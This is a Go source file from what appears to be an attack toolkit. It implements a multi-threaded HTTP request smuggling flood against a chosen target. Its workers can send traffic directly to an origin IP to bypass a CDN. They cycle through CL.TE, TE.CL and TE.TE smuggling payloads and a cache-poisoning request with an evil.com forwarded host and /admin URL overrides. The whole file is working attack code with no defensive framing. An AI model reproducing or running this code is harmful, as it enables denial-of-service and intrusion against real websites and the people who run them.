package attack

import (
	"crypto/tls"
	"fmt"
	"log"
	"net"
	"net/url"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// HTTP Request Smuggling (TE.CL / CL.TE)
// Exploits desync between front-end (CDN/LB) and back-end servers
// Front-end uses Content-Length, back-end uses Transfer-Encoding (or vice versa)
// Smuggled requests bypass CDN, hit origin directly = MAJOR impact

func runRequestSmuggling(cfg *AttackConfig) {
	atomic.StoreInt32(&stopFlag, 0)
	startTime := time.Now()
	deadline := startTime.Add(time.Duration(cfg.Duration) * time.Second)

	target := cfg.Target
	host := target
	port := "443"
	useTLS := true
	path := "/"

	if u, err := url.Parse(target); err == nil && u.Hostname() != "" {
		host = u.Hostname()
		if u.Port() != "" {
			port = u.Port()
		} else if u.Scheme == "http" {
			port = "80"
			useTLS = false
		}
		path = u.Path
		if path == "" {
			path = "/"
		}
	}

	hostHeader := host
	if cfg.OriginIP != "" {
		host = cfg.OriginIP
	}

	connCount := cfg.Threads
	if connCount < 50 {
		connCount = 100
	}

	log.Printf("HTTP Smuggling: %d workers, target %s:%s%s (Host: %s)",
		connCount, host, port, path, hostHeader)

	var wg sync.WaitGroup
	for i := 0; i < connCount; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			defer func() {
				if r := recover(); r != nil {
					log.Printf("Smuggle worker %d recovered: %v", id, r)
				}
			}()

			variant := id % 4

			for time.Now().Before(deadline) {
				if atomic.LoadInt32(&stopFlag) == 1 {
					return
				}

				err := smuggleRequest(host, port, hostHeader, path, useTLS, variant)
				atomic.AddInt64(&metrics.TotalRequests, 1)
				if err != nil {
					atomic.AddInt64(&metrics.Failed, 1)
					time.Sleep(20 * time.Millisecond)
				} else {
					atomic.AddInt64(&metrics.Completed, 1)
				}
			}
		}(i)
	}

	wg.Wait()
	metricsMu.Lock()
	metrics.Elapsed = time.Since(startTime).Seconds()
	metricsMu.Unlock()
}

func smuggleRequest(host, port, hostHeader, path string, useTLS bool, variant int) error {
	dialer := &net.Dialer{Timeout: 6 * time.Second}
	rawConn, err := dialer.Dial("tcp", host+":"+port)
	if err != nil {
		return err
	}
	defer rawConn.Close()

	if tcpConn, ok := rawConn.(*net.TCPConn); ok {
		tcpConn.SetNoDelay(true)
	}

	var conn net.Conn = rawConn
	if useTLS {
		tlsConn := tls.Client(rawConn, &tls.Config{
			InsecureSkipVerify: true,
			ServerName:         hostHeader,
		})
		tlsConn.SetDeadline(time.Now().Add(8 * time.Second))
		if err := tlsConn.Handshake(); err != nil {
			return err
		}
		conn = tlsConn
		defer tlsConn.Close()
	}

	conn.SetDeadline(time.Now().Add(6 * time.Second))

	var req string

	switch variant {
	case 0:
		// CL.TE - front uses Content-Length, back uses Transfer-Encoding
		smuggled := fmt.Sprintf("GET %s?_smuggle=%d HTTP/1.1\r\nHost: %s\r\n\r\n",
			path, time.Now().UnixNano(), hostHeader)
		body := "0\r\n\r\n" + smuggled
		req = fmt.Sprintf(
			"POST %s HTTP/1.1\r\n"+
				"Host: %s\r\n"+
				"User-Agent: %s\r\n"+
				"Content-Length: %d\r\n"+
				"Transfer-Encoding: chunked\r\n"+
				"\r\n%s",
			path, hostHeader, randomUA(), len(body), body,
		)

	case 1:
		// TE.CL - front uses TE, back uses CL
		smuggled := "0\r\n\r\nGET / HTTP/1.1\r\nHost: " + hostHeader + "\r\nX-Ignore: x"
		req = fmt.Sprintf(
			"POST %s HTTP/1.1\r\n"+
				"Host: %s\r\n"+
				"User-Agent: %s\r\n"+
				"Content-Length: 4\r\n"+
				"Transfer-Encoding: chunked\r\n"+
				"\r\n%s\r\n%s",
			path, hostHeader, randomUA(), formatChunkSize(len(smuggled)), smuggled,
		)

	case 2:
		// TE.TE - obfuscated TE header
		smuggled := fmt.Sprintf("GET %s?dup=%d HTTP/1.1\r\nHost: %s\r\nX-DUP: 1\r\n\r\n",
			path, time.Now().UnixNano(), hostHeader)
		body := fmt.Sprintf("%x\r\n%s\r\n0\r\n\r\n", len(smuggled), smuggled)
		req = fmt.Sprintf(
			"POST %s HTTP/1.1\r\n"+
				"Host: %s\r\n"+
				"User-Agent: %s\r\n"+
				"Transfer-Encoding: chunked\r\n"+
				"Transfer-encoding: x\r\n"+
				"\r\n%s",
			path, hostHeader, randomUA(), body,
		)

	default:
		// CRLF Header injection - poison cache
		req = fmt.Sprintf(
			"GET %s?id=%d HTTP/1.1\r\n"+
				"Host: %s\r\n"+
				"User-Agent: %s\r\n"+
				"X-Forwarded-Host: evil.com\r\n"+
				"X-Forwarded-For: %s\r\n"+
				"X-Original-URL: /admin\r\n"+
				"X-Rewrite-URL: /admin\r\n"+
				"Cookie: %s\r\n"+
				"Connection: close\r\n"+
				"\r\n",
			path, time.Now().UnixNano(), hostHeader, randomUA(),
			randomFakeIP(),
			strings.Repeat("a=b; ", 100),
		)
	}

	if _, err := conn.Write([]byte(req)); err != nil {
		return err
	}

	// Drain response
	buf := make([]byte, 8192)
	conn.SetReadDeadline(time.Now().Add(3 * time.Second))
	conn.Read(buf)

	return nil
}

func formatChunkSize(n int) string {
	return fmt.Sprintf("%x", n)
}

